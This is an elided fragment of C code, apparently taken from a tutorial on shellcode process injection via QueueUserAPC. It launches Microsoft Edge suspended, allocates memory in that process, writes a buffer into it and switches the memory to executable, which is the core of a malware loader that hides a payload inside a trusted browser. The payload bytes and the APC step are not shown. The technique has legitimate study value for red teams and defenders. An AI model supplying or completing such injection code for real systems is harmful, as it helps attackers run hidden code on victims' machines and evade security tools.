...
// https://nirajkharel.com.np/posts/process-injection-shellcode-queuUserApc/
...
int main()
{
    ...
    LPCWSTR execFile = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
    ...
    printf("[*] Created the process in suspended state!\n");

    LPVOID lpAddress = NULL;
    unsigned int dataLength = sizeof(data);
    SIZE_T lpNumberOfBytesWritten = 0;

    LPVOID lpAlloc = VirtualAllocEx(pi.hProcess, lpAddress, dataLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (lpAlloc == NULL) {
    ...
    BOOL bWrite = WriteProcessMemory(pi.hProcess, lpAlloc, lpBuffer, dataLength, &lpNumberOfBytesWritten);
    if (bWrite == FALSE) {
        printf("\nError Writing buffer to memory: %d", GetLastError());
        return -1;
    }
    printf("[*] Written buffer into the memory!\n");

    DWORD lpfOldProtect = NULL;
    if (!VirtualProtectEx(pi.hProcess, lpAlloc, dataLength, PAGE_EXECUTE_READ, &lpfOldProtect)) {
        printf("[-] Failed to change memory protection from RW to RX: %d \n", GetLastError());
        return -1;
    }
    printf("[*] Successfully executed VirtualProtect!");
